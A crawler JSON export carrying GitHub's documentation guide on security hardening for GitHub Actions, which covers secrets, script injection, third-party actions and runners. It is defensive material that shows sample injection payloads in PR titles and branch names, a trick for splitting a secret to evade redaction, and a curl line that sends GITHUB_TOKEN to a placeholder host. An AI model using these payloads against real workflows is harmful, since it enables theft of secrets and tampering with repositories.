future.\nDecentralized management:\nIf each team will manage their own self-hosted runners, then the recommendation is to add the runners at the highest level of team ownership. For example, if each team owns their own organization, then it will be simplest if the runners are added at the organization level too.\nYou could also add runners at the repository level, but this will add management overhead and also increases the numbers of runners you need, since you cannot share runners between repositories.\nAuthenticating to your cloud provider\nIf you are using GitHub Actions to deploy to a cloud provider, or intend to use HashiCorp Vault for secret management, then its recommended that you consider using OpenID Connect to create short-lived, well-scoped access tokens for your workflow runs. For more information, see About security hardening with OpenID Connect.\nAuditing GitHub Actions events\nYou can use the security log to monitor activity for your user account and the audit log to monitor activity in your organization. The security and audit log records the type of action, when it was run, and which personal account performed the action.\nFor example, you can use the audit log to track the org.update_actions_secret event, which tracks changes to organization secrets.\nFor the full list of events that you can find in the audit log for each account type, see the following articles:\nSecurity log events\nAudit log events for your organization",
  "htmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-security-guides-security-hardening-for-github-actions-dwtkdh.html",
  "markdown": "# Security hardening for GitHub Actions\n\nGood security practices for using GitHub Actions features.\n\n## [Overview](#overview)\n\nThis guide explains how to configure security hardening for certain GitHub Actions features. If the GitHub Actions concepts are unfamiliar, see [Understanding GitHub Actions](https://docs.github.com/en/actions/learn-github-actions/understanding-github-actions).\n\n## [Using secrets](#using-secrets)\n\nSensitive values should never be stored as plaintext in workflow files, but rather as secrets. [Secrets](https://docs.github.com/en/actions/security-guides/using-secrets-in-github-actions) can be configured at the organization, repository, or environment level, and allow you to store sensitive information in GitHub.\n\nSecrets use [Libsodium sealed boxes](https://libsodium.gitbook.io/doc/public-key_cryptography/sealed_boxes), so that they are encrypted before reaching GitHub. This occurs when the secret is submitted [using the UI](https://docs.github.com/en/actions/security-guides/using-secrets-in-github-actions#creating-secrets-for-a-repository) or through the [REST API](https://docs.github.com/en/rest/actions/secrets). This client-side encryption helps minimize the risks related to accidental logging (for example, exception logs and request logs, among others) within GitHub's infrastructure. Once the secret is uploaded, GitHub is then able to decrypt it so that it can be injected into the workflow runtime.\n\nTo help prevent accidental disclosure, GitHub uses a mechanism that attempts to redact any secrets that appear in run logs. This redaction looks for exact matches of any configured secrets used within the job, as well as common encodings of the values, such as Base64. However, because there are multiple ways a secret value can be transformed, this redaction is not guaranteed. Additionally, the runner can only redact secrets used within the current job. As a result, there are certain proactive steps and good practices you should follow to help ensure secrets are redacted, and to limit other risks associated with secrets:\n\n*   **Never use structured data as a secret**\n    *   Structured data can cause secret redaction within logs to fail, because redaction largely relies on finding an exact match for the specific secret value. For example, do not use a blob of JSON, XML, or YAML (or similar) to encapsulate a secret value, as this significantly reduces the probability the secrets will be properly redacted. Instead, create individual secrets for each sensitive value.\n*   **Register all secrets used within workflows**\n    *   If a secret is used to generate another sensitive value within a workflow, that generated value should be formally [registered as a secret](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret), so that it will be redacted if it ever appears in the logs. For example, if using a private key to generate a signed JWT to access a web API, be sure to register that JWT as a secret or else it won’t be redacted if it ever enters the log output.\n    *   Registering secrets applies to any sort of transformation/encoding as well. If your secret is transformed in some way (such as Base64 or URL-encoded), be sure to register the new value as a secret too.\n*   **Audit how secrets are handled**\n    *   Audit how secrets are used, to help ensure they’re being handled as expected. You can do this by reviewing the source code of the repository executing the workflow, and checking any actions used in the workflow. For example, check that they’re not sent to unintended hosts, or explicitly being printed to log output.\n    *   View the run logs for your workflow after testing valid/invalid inputs, and check that secrets are properly redacted, or not shown. It's not always obvious how a command or tool you’re invoking will send errors to `STDOUT` and `STDERR`, and secrets might subsequently end up in error logs. As a result, it is good practice to manually review the workflow logs after testing valid and invalid inputs. For information on how to clean up workflow logs that may unintentionally contain sensitive data, see [Using workflow run logs](https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/using-workflow-run-logs#deleting-logs).\n*   **Use credentials that are minimally scoped**\n    *   Make sure the credentials being used within workflows have the least privileges required, and be mindful that any user with write access to your repository has read access to all secrets configured in your repository.\n    *   Actions can use the `GITHUB_TOKEN` by accessing it from the `github.token` context. For more information, see [Accessing contextual information about workflow runs](https://docs.github.com/en/actions/learn-github-actions/contexts#github-context). You should therefore make sure that the `GITHUB_TOKEN` is granted the minimum required permissions. It's good security practice to set the default permission for the `GITHUB_TOKEN` to read access only for repository contents. The permissions can then be increased, as required, for individual jobs within the workflow file. For more information, see [Automatic token authentication](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github_token).\n*   **Audit and rotate registered secrets**\n    *   Periodically review the registered secrets to confirm they are still required. Remove those that are no longer needed.\n    *   Rotate secrets periodically to reduce the window of time during which a compromised secret is valid.\n*   **Consider requiring review for access to secrets**\n    *   You can use required reviewers to protect environment secrets. A workflow job cannot access environment secrets until approval is granted by a reviewer. For more information about storing secrets in environments or requiring reviews for environments, see [Using secrets in GitHub Actions](https://docs.github.com/en/actions/security-guides/using-secrets-in-github-actions) and [Managing environments for deployment](https://docs.github.com/en/actions/deployment/targeting-different-environments/managing-environments-for-deployment).\n\nWarning\n\nAny user with write access to your repository has read access to all secrets configured in your repository. Therefore, you should ensure that the credentials being used within workflows have the least privileges required.\n\n## [Using `CODEOWNERS` to monitor changes](#using-codeowners-to-monitor-changes)\n\nYou can use the `CODEOWNERS` feature to control how changes are made to your workflow files. For example, if all your workflow files are stored in `.github/workflows`, you can add this directory to the code owners list, so that any proposed changes to these files will first require approval from a designated reviewer.\n\nFor more information, see [About code owners](https://docs.github.com/en/repositories/managing-your-repositorys-settings-and-features/customizing-your-repository/about-code-owners).\n\n## [Understanding the risk of script injections](#understanding-the-risk-of-script-injections)\n\nWhen creating workflows, [custom actions](https://docs.github.com/en/actions/creating-actions/about-custom-actions), and [composite actions](https://docs.github.com/en/actions/creating-actions/creating-a-composite-action), you should always consider whether your code might execute untrusted input from attackers. This can occur when an attacker adds malicious commands and scripts to a context. When your workflow runs, those strings might be interpreted as code which is then executed on the runner.\n\nAttackers can add their own malicious content to the [`github` context](https://docs.github.com/en/actions/learn-github-actions/contexts#github-context), which should be treated as potentially untrusted input. These contexts typically end with `body`, `default_branch`, `email`, `head_ref`, `label`, `message`, `name`, `page_name`,`ref`, and `title`. For example: `github.event.issue.title`, or `github.event.pull_request.body`.\n\nYou should ensure that these values do not flow directly into workflows, actions, API calls, or anywhere else where they could be interpreted as executable code. By adopting the same defensive programming posture you would use for any other privileged application code, you can help security harden your use of GitHub Actions. For information on some of the steps an attacker could take, see [Security hardening for GitHub Actions](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#potential-impact-of-a-compromised-runner).\n\nIn addition, there are other less obvious sources of potentially untrusted input, such as branch names and email addresses, which can be quite flexible in terms of their permitted content. For example, `zzz\";echo${IFS}\"hello\";#` would be a valid branch name and would be a possible attack vector for a target repository.\n\nThe following sections explain how you can help mitigate the risk of script injection.\n\n### [Example of a script injection attack](#example-of-a-script-injection-attack)\n\nA script injection attack can occur directly within a workflow's inline script. In the following example, an action uses an expression to test the validity of a pull request title, but also adds the risk of script injection:\n\n```\n      - name: Check PR title\n        run: |\n          title=\"${{ github.event.pull_request.title }}\"\n          if [[ $title =~ ^octocat ]]; then\n          echo \"PR title starts with 'octocat'\"\n          exit 0\n          else\n          echo \"PR title did not start with 'octocat'\"\n          exit 1\n          fi\n```\n\nThis example is vulnerable to script injection because the `run` command executes within a temporary shell script on the runner. Before the shell script is run, the expressions inside `${{ }}` are evaluated and then substituted with the resulting values, which can make it vulnerable to shell command injection.\n\nTo inject commands into this workflow, the attacker could create a pull request with a title of `a\"; ls $GITHUB_WORKSPACE\"`:\n\n![Screenshot of the title of a pull request in edit mode. A new title has been entered in the field: a\"; ls $GITHUB_WORKSPACE\".](https://docs.github.com/assets/cb-25700/images/help/actions/example-script-injection-pr-title.png)\n\nIn this example, the `\"` character is used to interrupt the `title=\"${{ github.event.pull_request.title }}\"` statement, allowing the `ls` command to be executed on the runner. You can see the output of the `ls` command in the log:\n\n```\nRun title=\"a\"; ls $GITHUB_WORKSPACE\"\"\nREADME.md\ncode.yml\nexample.js\n```\n\n## [Good practices for mitigating script injection attacks](#good-practices-for-mitigating-script-injection-attacks)\n\nThere are a number of different approaches available to help you mitigate the risk of script injection:\n\n### [Using an action instead of an inline script (recommended)](#using-an-action-instead-of-an-inline-script-recommended)\n\nThe recommended approach is to create a JavaScript action that processes the context value as an argument. This approach is not vulnerable to the injection attack, since the context value is not used to generate a shell script, but is instead passed to the action as an argument:\n\n```\nuses: fakeaction/checktitle@v3\nwith:\n    title: ${{ github.event.pull_request.title }}\n```\n\n### [Using an intermediate environment variable](#using-an-intermediate-environment-variable)\n\nFor inline scripts, the preferred approach to handling untrusted input is to set the value of the expression to an intermediate environment variable.\n\nThe following example uses Bash to process the `github.event.pull_request.title` value as an environment variable:\n\n```\n      - name: Check PR title\n        env:\n          TITLE: ${{ github.event.pull_request.title }}\n        run: |\n          if [[ \"$TITLE\" =~ ^octocat ]]; then\n          echo \"PR title starts with 'octocat'\"\n          exit 0\n          else\n          echo \"PR title did not start with 'octocat'\"\n          exit 1\n          fi\n```\n\nIn this example, the attempted script injection is unsuccessful, which is reflected by the following lines in the log:\n\n```\n   env:\n     TITLE: a\"; ls $GITHUB_WORKSPACE\"\nPR title did not start with 'octocat'\n```\n\nWith this approach, the value of the `${{ github.event.pull_request.title }}` expression is stored in memory and used as a variable, and doesn't interact with the script generation process. In addition, consider using double quote shell variables to avoid [word splitting](https://github.com/koalaman/shellcheck/wiki/SC2086), but this is [one of many](https://mywiki.wooledge.org/BashPitfalls) general recommendations for writing shell scripts, and is not specific to GitHub Actions.\n\n### [Using workflow templates for code scanning](#using-workflow-templates-for-code-scanning)\n\nCode scanning allows you to find security vulnerabilities before they reach production. GitHub provides workflow templates for code scanning. You can use these suggested workflows to construct your code scanning workflows, instead of starting from scratch. GitHub's workflow, the CodeQL analysis workflow, is powered by CodeQL. There are also third-party workflow templates available.\n\nFor more information, see [About code scanning](https://docs.github.com/en/code-security/code-scanning/introduction-to-code-scanning/about-code-scanning) and [Configuring advanced setup for code scanning](https://docs.github.com/en/code-security/code-scanning/creating-an-advanced-setup-for-code-scanning/configuring-advanced-setup-for-code-scanning#configuring-code-scanning-using-third-party-actions).\n\n### [Restricting permissions for tokens](#restricting-permissions-for-tokens)\n\nTo help mitigate the risk of an exposed token, consider restricting the assigned permissions. For more information, see [Automatic token authentication](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#modifying-the-permissions-for-the-github_token).\n\n## [Using OpenID Connect to access cloud resources](#using-openid-connect-to-access-cloud-resources)\n\nIf your GitHub Actions workflows need to access resources from a cloud provider that supports OpenID Connect (OIDC), you can configure your workflows to authenticate directly to the cloud provider. This will let you stop storing these credentials as long-lived secrets and provide other security benefits. For more information, see [About security hardening with OpenID Connect](https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/about-security-hardening-with-openid-connect).\n\nNote\n\nSupport for custom claims for OIDC is unavailable in AWS.\n\n## [Using third-party actions](#using-third-party-actions)\n\nThe individual jobs in a workflow can interact with (and compromise) other jobs. For example, a job querying the environment variables used by a later job, writing files to a shared directory that a later job processes, or even more directly by interacting with the Docker socket and inspecting other running containers and executing commands in them.\n\nThis means that a compromise of a single action within a workflow can be very significant, as that compromised action would have access to all secrets configured on your repository, and may be able to use the `GITHUB_TOKEN` to write to the repository. Consequently, there is significant risk in sourcing actions from third-party repositories on GitHub. For information on some of the steps an attacker could take, see [Security hardening for GitHub Actions](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#potential-impact-of-a-compromised-runner).\n\nYou can help mitigate this risk by following these good practices:\n\n*   **Pin actions to a full length commit SHA**\n    \n    Pinning an action to a full length commit SHA is currently the only way to use an action as an immutable release. Pinning to a particular SHA helps mitigate the risk of a bad actor adding a backdoor to the action's repository, as they would need to generate a SHA-1 collision for a valid Git object payload. When selecting a SHA, you should verify it is from the action's repository and not a repository fork.\n    \n*   **Audit the source code of the action**\n    \n    Ensure that the action is handling the content of your repository and secrets as expected. For example, check that secrets are not sent to unintended hosts, or are not inadvertently logged.\n    \n*   **Pin actions to a tag only if you trust the creator**\n    \n    Although pinning to a commit SHA is the most secure option, specifying a tag is more convenient and is widely used. If you’d like to specify a tag, then be sure that you trust the action's creators. The ‘Verified creator’ badge on GitHub Marketplace is a useful signal, as it indicates that the action was written by a team whose identity has been verified by GitHub. Note that there is risk to this approach even if you trust the author, because a tag can be moved or deleted if a bad actor gains access to the repository storing the action.\n    \n\n## [Reusing third-party workflows](#reusing-third-party-workflows)\n\nThe same principles described above for using third-party actions also apply to using third-party workflows. You can help mitigate the risks associated with reusing workflows by following the same good practices outlined above. For more information, see [Reusing workflows](https://docs.github.com/en/actions/using-workflows/reusing-workflows).\n\n## [Using Dependabot version updates to keep actions up to date](#using-dependabot-version-updates-to-keep-actions-up-to-date)\n\nYou can use Dependabot to ensure that references to actions and reusable workflows used in your repository are kept up to date. Actions are often updated with bug fixes and new features to make automated processes faster, safer, and more reliable. Dependabot takes the effort out of maintaining your dependencies as it does this automatically for you. For more information, see [Keeping your actions up to date with Dependabot](https://docs.github.com/en/code-security/dependabot/working-with-dependabot/keeping-your-actions-up-to-date-with-dependabot) and [About Dependabot security updates](https://docs.github.com/en/code-security/dependabot/dependabot-security-updates/about-dependabot-security-updates).\n\n## [Preventing GitHub Actions from creating or approving pull requests](#preventing-github-actions-from-creating-or-approving-pull-requests)\n\nYou can choose to allow or prevent GitHub Actions workflows from creating or approving pull requests. Allowing workflows, or any other automation, to create or approve pull requests could be a security risk if the pull request is merged without proper oversight.\n\nFor more information on how to configure this setting, see [Disabling or limiting GitHub Actions for your organization](https://docs.github.com/en/github/setting-up-and-managing-organizations-and-teams/disabling-or-limiting-github-actions-for-your-organization#preventing-github-actions-from-creating-or-approving-pull-requests), and [Managing GitHub Actions settings for a repository](https://docs.github.com/en/repositories/managing-your-repositorys-settings-and-features/enabling-features-for-your-repository/managing-github-actions-settings-for-a-repository#preventing-github-actions-from-creating-or-approving-pull-requests).\n\n## [Using code scanning to secure workflows](#using-code-scanning-to-secure-workflows)\n\nCode scanning can automatically detect and suggest improvements for common vulnerable patterns used in GitHub Actions workflows. For more information on how to enable code scanning, see [Configuring default setup for code scanning](https://docs.github.com/en/code-security/code-scanning/enabling-code-scanning/configuring-default-setup-for-code-scanning).\n\n## [Using OpenSSF Scorecards to secure workflow dependencies](#using-openssf-scorecards-to-secure-workflow-dependencies)\n\n[Scorecards](https://github.com/ossf/scorecard) is an automated security tool that flags risky supply chain practices. You can use the [Scorecards action](https://github.com/marketplace/actions/ossf-scorecard-action) and [workflow template](https://github.com/actions/starter-workflows) to follow best security practices. Once configured, the Scorecards action runs automatically on repository changes, and alerts developers about risky supply chain practices using the built-in code scanning experience. The Scorecards project runs a number of checks, including script injection attacks, token permissions, and pinned actions.\n\n## [Potential impact of a compromised runner](#potential-impact-of-a-compromised-runner)\n\nThese sections consider some of the steps an attacker can take if they're able to run malicious commands on a GitHub Actions runner.\n\nNote\n\nGitHub-hosted runners do not scan for malicious code downloaded by a user during their job, such as a compromised third party library.\n\n### [Accessing secrets](#accessing-secrets)\n\nWorkflows triggered from a forked repository using the `pull_request` event have read-only permissions and have no access to secrets. However, these permissions differ for various event triggers such as `issue_comment`, `issues`, `push` and `pull_request` from a branch within the repository, where the attacker could attempt to steal repository secrets or use the write permission of the job's [`GITHUB_TOKEN`](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github_token).\n\n*   If the secret or token is set to an environment variable, it can be directly accessed through the environment using `printenv`.\n    \n*   If the secret is used directly in an expression, the generated shell script is stored on-disk and is accessible.\n    \n*   For a custom action, the risk can vary depending on how a program is using the secret it obtained from the argument:\n    \n    ```\n    uses: fakeaction/publish@v3\n    with:\n        key: ${{ secrets.PUBLISH_KEY }}\n    ```\n    \n\nAlthough GitHub Actions scrubs secrets from memory that are not referenced in the workflow (or an included action), the `GITHUB_TOKEN` and any referenced secrets can be harvested by a determined attacker.\n\n### [Exfiltrating data from a runner](#exfiltrating-data-from-a-runner)\n\nAn attacker can exfiltrate any stolen secrets or other data from the runner. To help prevent accidental secret disclosure, GitHub Actions [automatically redact secrets printed to the log](https://docs.github.com/en/actions/security-guides/using-secrets-in-github-actions#accessing-your-secrets), but this is not a true security boundary because secrets can be intentionally sent to the log. For example, obfuscated secrets can be exfiltrated using `echo ${SOME_SECRET:0:4}; echo ${SOME_SECRET:4:200};`. In addition, since the attacker may run arbitrary commands, they could use HTTP requests to send secrets or other repository data to an external server.\n\n### [Stealing the job's `GITHUB_TOKEN`](#stealing-the-jobs-github_token)\n\nIt is possible for an attacker to steal a job's `GITHUB_TOKEN`. The GitHub Actions runner automatically receives a generated `GITHUB_TOKEN` with permissions that are limited to just the repository that contains the workflow, and the token expires after the job has completed. Once expired, the token is no longer useful to an attacker. To work around this limitation, they can automate the attack and perform it in fractions of a second by calling an attacker-controlled server with the token, for example: `a\"; set +e; curl http://example.com?token=$GITHUB_TOKEN;#`.\n\n### [Modifying the contents of a repository](#modifying-the-contents-of-a-repository)\n\nThe attacker server can use the GitHub API to [modify repository content](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github_token), including releases, if the assigned permissions of `GITHUB_TOKEN` [are not restricted](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#modifying-the-permissions-for-the-github_token).\n\n## [Considering cross-repository access](#considering-cross-repository-access)\n\nGitHub Actions is intentionally scoped for a single repository at a time. The `GITHUB_TOKEN` grants the same level of access as a write-access user, because any write-access user can access this token by creating or modifying a workflow file, elevating the permissions of the `GITHUB_TOKEN` if necessary. Users have specific permissions for each repository, so allowing the `GITHUB_TOKEN` for one repository to grant access to another would impact the GitHub permission model if not implemented carefully. Similarly, caution must be taken when adding GitHub authentication tokens to a workflow, because this can also affect the GitHub permission model by inadvertently granting broad access to collaborators.\n\nIf your organization is owned by an enterprise account, then you can share and reuse GitHub Actions by storing them in internal repositories. For more information, see [Sharing actions and workflows with your enterprise](https://docs.github.com/en/actions/creating-actions/sharing-actions-and-workflows-with-your-enterprise).\n\nYou can perform other privileged, cross-repository interactions by referencing a GitHub authentication token or SSH key as a secret within the workflow. Because many authentication token types do not allow for granular access to specific resources, there is significant risk in using the wrong token type, as it can grant much broader access than intended.\n\nThis list describes the recommended approaches for accessing repository data within a workflow, in descending order of preference:\n\n1.  **The `GITHUB_TOKEN`**\n    *   This token is intentionally scoped to the single repository that invoked the workflow, and can have the same level of access as a write-access user on the repository. The token is created before each job begins and expires when the job is finished. For more information, see [Automatic token authentication](https://docs.github.com/en/actions/security-guides/automatic-token-authentication).\n    *   The `GITHUB_TOKEN` should be used whenever possible.\n2.  **Repository deploy key**\n    *   Deploy keys are one of the only credential types that grant read or write access to a single repository, and can be used to interact with another repository within a workflow. For more information, see [Managing deploy keys](https://docs.github.com/en/authentication/connecting-to-github-with-ssh/managing-deploy-keys#deploy-keys).\n    *   Note that deploy keys can only clone and push to the repository using Git, and cannot be used to interact with the REST or GraphQL API, so they may not be appropriate for your requirements.\n3.  **GitHub App tokens**\n    *   GitHub Apps can be installed on select repositories, and even have granular permissions on the resources within them. You could create a GitHub App internal to your organization, install it on the repositories you need access to within your workflow, and authenticate as the installation within your workflow to access those repositories. For more information, see [Making authenticated API requests with a GitHub App in a GitHub Actions workflow](https://docs.github.com/en/apps/creating-github-apps/guides/making-authenticated-api-requests-with-a-github-app-in-a-github-actions-workflow).\n4.  **personal access tokens**\n    *   You should never use a personal access token (classic). These tokens grant access to all repositories within the organizations that you have access to, as well as all personal repositories in your personal account. This indirectly grants broad access to all write-access users of the repository the workflow is in.\n    *   If you do use a personal access token, you should never use a personal access token from your own account. If you later leave an organization, workflows using this token will immediately break, and debugging this issue can be challenging. Instead, you should use a fine-grained personal access token for a new account that belongs to your organization and that is only granted access to the specific repositories that are needed for the workflow. Note that this approach is not scalable and should be avoided in favor of alternatives, such as deploy keys.\n5.  **SSH keys on a personal account**\n    *   Workflows should never use the SSH keys on a personal account. Similar to personal access tokens (classic), they grant read/write permissions to all of your personal repositories as well as all the repositories you have access to through organization membership. This indirectly grants broad access to all write-access users of the repository the workflow is in. If you're intending to use an SSH key because you only need to perform repository clones or pushes, and do not need to interact with public APIs, then you should use individual deploy keys instead.\n\n## [Hardening for GitHub-hosted runners](#hardening-for-github-hosted-runners)\n\nGitHub-hosted runners take measures to help you mitigate security risks.\n\n### [Reviewing the supply chain for GitHub-hosted runners](#reviewing-the-supply-chain-for-github-hosted-runners)\n\nFor GitHub-hosted runners created from images maintained by GitHub, you can view a software bill of materials (SBOM) to see what software was pre-installed on the runner. You can provide your users with the SBOM which they can run through a vulnerability scanner to validate if there are any vulnerabilities in the product. If you are building artifacts, you can include this SBOM in your bill of materials for a comprehensive list of everything that went into creating your software.\n\nSBOMs are available for Ubuntu, Windows, and macOS runner images maintained by GitHub. You can locate the SBOM for your build in the release assets at [https://github.com/actions/runner-images/releases](https://github.com/actions/runner-images/releases). An SBOM with a filename in the format of `sbom.IMAGE-NAME.json.zip` can be found in the attachments of each release.\n\nFor third-party images, such as the images for ARM-powered runners, you can find details of the software that's included in the image in the [`actions/partner-runner-images` repository](https://github.com/actions/partner-runner-images).\n\n### [Denying access to hosts](#denying-access-to-hosts)\n\nGitHub-hosted runners are provisioned with an `etc/hosts` file that blocks network access to various cryptocurrency mining pools and malicious sites. Hosts such as MiningMadness.com and cpu-pool.com are rerouted to localhost so that they do not present a significant security risk. For more information, see [Using GitHub-hosted runners](https://docs.github.com/en/actions/using-github-hosted-runners/about-github-hosted-runners).\n\n## [Hardening for self-hosted runners](#hardening-for-self-hosted-runners)\n\n**GitHub-hosted** runners execute code within ephemeral and clean isolated virtual machines, meaning there is no way to persistently compromise this environment, or otherwise gain access to more information than was placed in this environment during the bootstrap process.\n\n**Self-hosted** runners for GitHub do not have guarantees around running in ephemeral clean virtual machines, and can be persistently compromised by untrusted code in a workflow.\n\nAs a result, self-hosted runners should almost [never be used for public repositories](https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions) on GitHub, because any user can open pull requests against the repository and compromise the environment. Similarly, be cautious when using self-hosted runners on private or internal repositories, as anyone who can fork the repository and open a pull request (generally those with read access to the repository) are able to compromise the self-hosted runner environment, including gaining access to secrets and the `GITHUB_TOKEN` which, depending on its settings, can grant write access to the repository. Although workflows can control access to environment secrets by using environments and required reviews, these workflows are not run in an isolated environment and are still susceptible to the same risks when run on a self-hosted runner.\n\nOrganization owners can choose which repositories are allowed to create repository-level self-hosted runners.\n\nFor more information, see [Disabling or limiting GitHub Actions for your organization](https://docs.github.com/en/organizations/managing-organization-settings/disabling-or-limiting-github-actions-for-your-organization#limiting-the-use-of-self-hosted-runners).\n\nWhen a self-hosted runner is defined at the organization or enterprise level, GitHub can schedule workflows from multiple repositories onto the same runner. Consequently, a security compromise of these environments can result in a wide impact. To help reduce the scope of a compromise, you can create boundaries by organizing your self-hosted runners into separate groups. You can restrict what organizations and repositories can access runner groups. For more information, see [Managing access to self-hosted runners using groups](https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners/managing-access-to-self-hosted-runners-using-groups).\n\nYou should also consider the environment of the self-hosted runner machines:\n\n*   What sensitive information resides on the machine configured as a self-hosted runner? For example, private SSH keys, API access tokens, among others.\n*   Does the machine have network access to sensitive services? For example, Azure or AWS metadata services. The amount of sensitive information in this environment should be kept to a minimum, and you should always be mindful that any user capable of invoking workflows has access to this environment.\n\nSome customers might attempt to partially mitigate these risks by implementing systems that automatically destroy the self-hosted runner after each job execution. However, this approach might not be as effective as intended, as there is no way to guarantee that a self-hosted runner only runs one job. Some jobs will use secrets as command-line arguments which can be seen by another job running on the same runner, such as `ps x -w`. This can lead to secret leakages.\n\n### [Using just-in-time runners](#using-just-in-time-runners)\n\nTo improve runner registration security, you can use the REST API to create ephemeral, just-in-time (JIT) runners. These self-hosted runners perform at most one job before being automatically removed from the repository, organization, or enterprise. For more information about configuring JIT runners, see [REST API endpoints for self-hosted runners](https://docs.github.com/en/rest/actions/self-hosted-runners#create-configuration-for-a-just-in-time-runner-for-an-organization).\n\nNote\n\nRe-using hardware to host JIT runners can risk exposing information from the environment. Use automation to ensure the JIT runner uses a clean environment. For more information, see [Autoscaling with self-hosted runners](https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners/autoscaling-with-self-hosted-runners#using-ephemeral-runners-for-autoscaling).\n\nOnce you have the config file from the REST API response, you can pass it to the runner at startup.\n\n```\n./run.sh --jitconfig ${encoded_jit_config}\n```\n\n### [Planning your management strategy for self-hosted runners](#planning-your-management-strategy-for-self-hosted-runners)\n\nA self-hosted runner can be added to various levels in your GitHub hierarchy: the enterprise, organization, or repository level. This placement determines who will be able to manage the runner:\n\n**Centralized management:**\n\n*   If you plan to have a centralized team own the self-hosted runners, then the recommendation is to add your runners at the highest mutual organization or enterprise level. This gives your team a single location to view and manage your runners.\n*   If you only have a single organization, then adding your runners at the organization level is effectively the same approach, but you might encounter difficulties if you add another organization in the future.\n\n**Decentralized management:**\n\n*   If each team will manage their own self-hosted runners, then the recommendation is to add the runners at the highest level of team ownership. For example, if each team owns their own organization, then it will be simplest if the runners are added at the organization level too.\n*   You could also add runners at the repository level, but this will add management overhead and also increases the numbers of runners you need, since you cannot share runners between repositories.\n\n### [Authenticating to your cloud provider](#authenticating-to-your-cloud-provider)\n\nIf you are using GitHub Actions to deploy to a cloud provider, or intend to use HashiCorp Vault for secret management, then its recommended that you consider using OpenID Connect to create short-lived, well-scoped access tokens for your workflow runs. For more information, see [About security hardening with OpenID Connect](https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/about-security-hardening-with-openid-connect).\n\n## [Auditing GitHub Actions events](#auditing-github-actions-events)\n\nYou can use the security log to monitor activity for your user account and the audit log to monitor activity in your organization. The security and audit log records the type of action, when it was run, and which personal account performed the action.\n\nFor example, you can use the audit log to track the `org.update_actions_secret` event, which tracks changes to organization secrets.\n\n![Screenshot showing a search for \"action:org.update_actions_secret\" in the audit log for an organization. Two results are shown.](https://docs.github.com/assets/cb-82962/images/help/repository/audit-log-entries.png)\n\nFor the full list of events that you can find in the audit log for each account type, see the following articles:\n\n*   [Security log events](https://docs.github.com/en/authentication/keeping-your-account-and-data-secure/security-log-events)\n*   [Audit log events for your organization](https://docs.github.com/en/organizations/keeping-your-organization-secure/managing-security-settings-for-your-organization/audit-log-events-for-your-organization)",
  "debug": {
    "pageType": "Article",
    "pageTypeReason": "HasUrlDashes",
    "totalLinks": 326,
    "response": {
      "statusCode": 200
    },
    "snapshots": {
      "originalHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-security-guides-security-hardening-for-github-actions-originalHtmlUrl",
      "removedElementsHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-security-guides-security-hardening-for-github-actions-removedElementsHtmlUrl",
      "extractusHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-security-guides-security-hardening-for-github-actions-extractusHtmlUrl",
      "readableTextHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-security-guides-security-hardening-for-github-actions-readableTextHtmlUrl",
      "readableTextIfPossibleHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-security-guides-security-hardening-for-github-actions-readableTextIfPossibleHtmlUrl"
    },
    "lengths": {
      "extractus": 48286,
      "readableText": 44013,
      "none": 66366,
      "readableTextIfPossible": 44013,
      "result": 44013,
      "markdown": 38340
    },
    "requestHandlerMode": "browser"
  }
},
{
  "url": "https://docs.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/configuring-openid-connect-in-amazon-web-services",
  "crawl": {
    "loadedUrl": "https://docs.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/configuring-openid-connect-in-amazon-web-services",
    "loadedTime": "2025-05-08T06:37:04.516Z",
    "referrerUrl": "https://docs.github.com/en/actions",
    "depth": 1,
    "httpStatusCode": 200
  },
  "metadata": {
    "canonicalUrl": "https://docs.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/configuring-openid-connect-in-amazon-web-services",
    "title": "Configuring OpenID Connect in Amazon Web Services - GitHub Docs",
    "description": "Use OpenID Connect within your workflows to authenticate with Amazon Web Services.",
    "author": null,
    "keywords": "Security",
    "languageCode": "en",
    "openGraph": [
      {
        "property": "og:site_name",
        "content": "GitHub Docs"
      },
      {
        "property": "og:title",
        "content": "Configuring OpenID Connect in Amazon Web Services - GitHub Docs"
      },
      {
        "property": "og:type",
        "content": "article"
      },
      {
        "property": "og:url",
        "content": "https://docs-internal.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/configuring-openid-connect-in-amazon-web-services"
      },
      {
        "property": "og:image",
        "content": "https://docs.github.com/assets/cb-345/images/social-cards/actions.png"
      },
      {
        "property": "twitter:domain",
        "content": "docs-internal.github.com"
      },
      {
        "property": "twitter:url",
        "content": "https://docs-internal.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/configuring-openid-connect-in-amazon-web-services"
      }
    ],
    "jsonLd": null,
    "headers": {
      "access-control-allow-origin": "*",
